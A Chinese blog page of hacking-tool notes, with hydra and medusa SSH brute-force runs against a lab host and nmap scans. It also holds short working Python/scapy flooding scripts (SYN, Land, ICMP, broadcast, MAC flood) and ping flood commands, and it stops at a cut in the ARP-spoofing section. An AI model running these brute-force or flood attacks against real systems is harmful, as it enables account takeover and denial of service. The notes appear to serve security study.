@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zwjsfdbb.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="1、爆破工具  hydra  1234567891011121314151617Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="工具篇">
+<meta property="og:url" content="http://zwjsfdbb.top/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/index.html">
+<meta property="og:site_name" content="fengchuiguo">
+<meta property="og:description" content="1、爆破工具  hydra  1234567891011121314151617Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150600273.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150828129.png">
+<meta property="article:published_time" content="2023-10-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-12T10:43:12.598Z">
+<meta property="article:author" content="fengchuiguo">
+<meta property="article:tag" content="黑客工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150600273.png">
+
+<link rel="canonical" href="http://zwjsfdbb.top/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>工具篇 | fengchuiguo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fengchuiguo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fengchuiguo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengchuiguo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          工具篇
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-31 00:00:00" itemprop="dateCreated datePublished" datetime="2023-10-31T00:00:00+08:00">2023-10-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">黑客工具</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>1、爆破工具</p>
+<ul>
+<li>hydra</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ hydra -l cleint -P ./password.txt 192.168.101.7 ssh          </span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-31 10:42:10</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.101.7:22/</span><br><span class="line">[22][ssh] host: 192.168.101.7   login: cleint   password: qwe123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 10:42:12</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>medusa</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ medusa -h 192.168.101.7 -u cleint -P ./password.txt -M ssh    </span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: 123456 (1 of 2 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: qwe123 (2 of 2 complete)</span><br><span class="line">ACCOUNT FOUND: [ssh] Host: 192.168.101.7 User: cleint Password: qwe123 [SUCCESS]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2、端口扫描工具</p>
+<p>nmap</p>
+<ul>
+<li><p>扫描操作系统</p>
+<p>原理 ：<strong>Nmap维护一个nmap-os-db数据库</strong>，存储了上千种操作系统信息，简单一点来说,<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Nmap&spm=1001.2101.3001.7020">Nmap</a>通过TCP&#x2F;IP协议栈的指纹信息来识别目标主机的操作系统信息，这<strong>主要是利用了RFC标准中，没有强制规范了TCP&#x2F;IP的某些实现,于是不同的系统中TCP&#x2F;IP的实现方案可能都有其特定的方式，这些细节上的差异，给nmap识别操作系统信息提供了方案</strong>，具体一点说,Nmap分别<strong>挑选一个close和open的端口，分别发送给一个经过精心设计的TCP&#x2F;UDP数据包，当然这个数据包也可能是ICMP数据包</strong>。然后根据收到返回报文,生成一份系统指纹。通过对比检测生成的指纹和nmap-os-db数据库中的指纹，来查找匹配的系统。最坏的情况下，没有办法匹配的时候,则用概率的形式枚举出所有可能的信息。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -O 192.168.101.10</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 09:57 EDT</span><br><span class="line">Nmap scan report for 192.168.101.10 (192.168.101.10)</span><br><span class="line">Host is up (0.00090s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP</span><br><span class="line">Running: Actiontec embedded, Linux</span><br><span class="line">OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel</span><br><span class="line">OS details: Actiontec MI424WR-GEN3I WAP</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.34 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描IP地址  判断存活 基于ARP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.101.1/24</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 10:04 EDT</span><br><span class="line">Nmap scan report for 192.168.101.1 (192.168.101.1)</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">MAC Address: 68:77:24:36:8F:BC (Unknown)</span><br><span class="line">Nmap scan report for 192.168.101.2 (192.168.101.2)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">MAC Address: 3C:06:A7:0C:63:B5 (Unknown)</span><br><span class="line">Nmap scan report for 192.168.101.4 (192.168.101.4)</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">MAC Address: E0:BB:9E:4B:EF:D0 (Seiko Epson)</span><br><span class="line">Nmap scan report for 192.168.101.5 (192.168.101.5)</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line">MAC Address: 86:4A:E5:5B:64:C8 (Unknown)</span><br><span class="line">Nmap scan report for 192.168.101.6 (192.168.101.6)</span><br><span class="line">Host is up (0.048s latency).</span><br><span class="line">MAC Address: 34:7D:F6:24:3E:1B (Intel Corporate)</span><br><span class="line">Nmap scan report for 192.168.101.8 (192.168.101.8)</span><br><span class="line">Host is up (0.000054s latency).</span><br><span class="line">MAC Address: 4C:ED:FB:94:B4:25 (Asustek Computer)</span><br><span class="line">Nmap scan report for 192.168.101.10 (192.168.101.10)</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">MAC Address: 00:0C:29:C8:D9:ED (VMware)</span><br><span class="line">Nmap scan report for 192.168.101.7 (192.168.101.7)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 9.40 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>扫描端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">基于三次握手 namp -sT IP</span><br><span class="line">基于SYN     nmap -sS IP</span><br><span class="line">基于ACK     nmap -sA IP</span><br><span class="line">不进行ping  nmap -Pn IP</span><br><span class="line"></span><br><span class="line">扫描端口和版本 nmap -sV IP</span><br><span class="line">└─# nmap -sV 192.168.101.10 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 10:14 EDT</span><br><span class="line">Nmap scan report for 192.168.101.10 (192.168.101.10)</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">22/tcp   open   ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open   http    Apache httpd 2.4.56 ((Unix) OpenSSL/1.1.1t PHP/8.2.4 mod_perl/2.0.12 Perl/v5.34.1)</span><br><span class="line">3306/tcp closed mysql</span><br><span class="line">MAC Address: 00:0C:29:C8:D9:ED (VMware)</span><br><span class="line"></span><br><span class="line">指定端口   nmap -p10-200, -p21,22</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>3、子域名扫描工具</p>
+<ul>
+<li>python ping&#x2F;socket</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基于ping命令的子域名扫描</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subdomain_ping</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        datalines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> datalines:</span><br><span class="line">        sub_domain = line.strip() + <span class="string">&#x27;.&#x27;</span> + domain</span><br><span class="line">        result = os.popen(<span class="string">f&quot;ping -n 1 -w 1000 <span class="subst">&#123;sub_domain&#125;</span>&quot;</span>).read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;TTL&#x27;</span> <span class="keyword">in</span> result <span class="keyword">or</span> <span class="string">&quot;请求超时&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sub_domain&#125;</span> 存在&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;找不到主机&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sub_domain&#125;</span> 不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于socket库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subdomain_socket</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        datalines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> datalines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sub_domain = line.strip() + <span class="string">&#x27;.&#x27;</span> + domain</span><br><span class="line">            ip = socket.gethostbyname(sub_domain)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sub_domain&#125;</span> ip is <span class="subst">&#123;ip&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>windows Layer 子域名</p>
+</li>
+<li><p>kali  dnsenum</p>
+</li>
+<li><p>在线子域名扫描网站</p>
+</li>
+</ul>
+<p>4、后台扫描工具</p>
+<ul>
+<li><p>御剑</p>
+<p>扫描后台地址</p>
+</li>
+</ul>
+<p>5、web站点信息采集</p>
+<ul>
+<li><p>kali  whatweb</p>
+</li>
+<li><p>whois信息  可通过whois 网站和python-whois 库</p>
+</li>
+<li><p>nslookup 可以用于确认是否使用CDN网络</p>
+</li>
+<li><p>fofa.info</p>
+</li>
+<li><p>shodan 网络设备查找 （如附近的摄像头、工控设备、路由器、打印机等）</p>
+</li>
+</ul>
+<p>6、泛洪攻击</p>
+<p>基于协议通信，完成大流量高并发操作，导致目标主机各类资源消耗过多而无法提供正常的服务。（MAC地址泛洪，ARP泛洪欺骗）</p>
+<p>（1）正常通信</p>
+<p>（2）目标主机未配置很好的防护措施</p>
+<ul>
+<li><p>socket 三次握手泛洪</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tcp 三次握手泛洪</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">socket_flood</span>(<span class="params">target_ip</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((target_ip, <span class="number">80</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>scapy半连接泛洪</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scapy 半连接泛洪</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scapy_flood</span>(<span class="params">target_ip</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pkg = IP(dst=target_ip) / TCP(dport=<span class="number">80</span>, flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">        send(pkg, verbose=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>TCP Land泛洪</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCP Land 泛洪 (源IP和目的IP是一样的)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">land_flood</span>(<span class="params">target_ip</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pkg = IP(src=target_ip, dst=target_ip) / TCP(dport=<span class="number">80</span>, flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">        send(pkg, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>ICMP泛洪</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ICMP  泛洪  可以伪造src发包给target_ip,从而导致伪造的src主机全都发包给target_ip,即为反射攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">icmp_flood</span>(<span class="params">target_ip</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;HHHHHHHHHHHHHHHHHHH&quot;</span></span><br><span class="line">        pkg = IP(dst=target_ip) / ICMP() / payload</span><br><span class="line">        send(pkg, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>ICMP 广播风暴</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 广播风暴</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">icmp_broadcast</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;HHHHHHHHHHHHHHHHHHH&quot;</span></span><br><span class="line">        pkg = IP(dst=<span class="string">&quot;192.168.101.255&quot;</span>) / ICMP() / payload</span><br><span class="line">        send(pkg, verbose=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ping命令</p>
+<ul>
+<li>设置间隔很小</li>
+<li>设置数据包很大</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping -i 0.001 -s 2000 target_ip</span><br><span class="line">ping -f target_ip</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MAC地址泛洪</p>
+<p>定义随机MAC地址，不停的发送该条数据，交换机发现MAC表不存在，将其添加到MAC表中，从而填满MAC表，导致新的数据包无法添加到MAC表，只能广播或者交换机崩溃</p>
+</li>
+</ul>
+<p>​		工具 ： macof 用于对交换机进行mac地址表溢出 <strong>sudo apt install dsniff</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MAC地址泛洪</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        random_smac = RandMAC(<span class="string">&quot;*:*:*:*:*:*&quot;</span>)</span><br><span class="line">        random_dmac = RandMAC(<span class="string">&quot;*:*:*:*:*:*&quot;</span>)</span><br><span class="line">        random_src_ip = RandIP()</span><br><span class="line">        random_dst_ip = RandIP()</span><br><span class="line"></span><br><span class="line">        pkg = Ether(src=random_smac, dst=random_dmac) / IP(src=random_src_ip, dst=random_dst_ip)</span><br><span class="line">        send(pkg, iface=<span class="string">&quot;&quot;</span>, loop=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>虚拟机 默认使用混杂模式，可以监控到其他主机的流量</p>
+<ul>
+<li><p>arp 攻击   </p>
+<p>工具： arpspoof </p>
